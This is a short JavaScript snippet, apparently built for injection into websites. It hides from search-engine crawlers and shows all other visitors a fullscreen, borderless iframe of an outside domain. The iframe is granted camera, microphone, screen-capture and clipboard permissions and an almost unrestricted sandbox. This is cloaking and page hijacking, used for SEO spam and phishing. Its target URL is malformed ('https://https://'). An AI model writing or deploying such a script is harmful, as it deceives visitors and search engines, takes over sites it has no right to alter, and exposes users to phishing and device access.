(function () {
  // Target URL to embed
  const targetUrl = 'https://https://ihateovercloaked.zinko.uk/';

  // Basic bot/crawler detection based on user-agent strings
  const userAgent = navigator.userAgent.toLowerCase();
  const isBot = /bot|googlebot|crawler|spider|robot|crawling|slurp|bingbot|yandex|baidu/i.test(userAgent);

  // Stop execution if a recognized search crawler is executing JS
  if (isBot) {
    return;
  }

  // Create iframe in memory
  const iframe = document.createElement('iframe');
  iframe.src = targetUrl;

  // Visual styling for total fullscreen coverage
  iframe.style.position = 'fixed';
  iframe.style.top = '0';
  iframe.style.left = '0';
  iframe.style.width = '100vw';
  iframe.style.height = '100vh';
  iframe.style.border = 'none';
  iframe.style.outline = 'none';
  iframe.style.zIndex = '999999';

  // Fullscreen attributes across all vendor prefixes
  iframe.setAttribute('allowfullscreen', 'true');
  iframe.setAttribute('webkitallowfullscreen', 'true');
  iframe.setAttribute('mozallowfullscreen', 'true');

  // Permissions policy allowing fullscreen, autoplay, audio/video capabilities
  iframe.setAttribute(
    'allow',
    'fullscreen; autoplay; clipboard-write; encrypted-media; picture-in-picture; camera; microphone; display-capture'
  );

  // Maximum permissive sandbox parameters
  iframe.setAttribute(
    'sandbox',
    'allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-downloads allow-orientation-lock allow-pointer-lock allow-presentation allow-top-navigation'
  );

  // Mount iframe into DOM
  const init = () => {
    document.body.appendChild(iframe);
  };

  if (document.body) {
    init();
  } else {
    document.addEventListener('DOMContentLoaded', init);
  }
})();
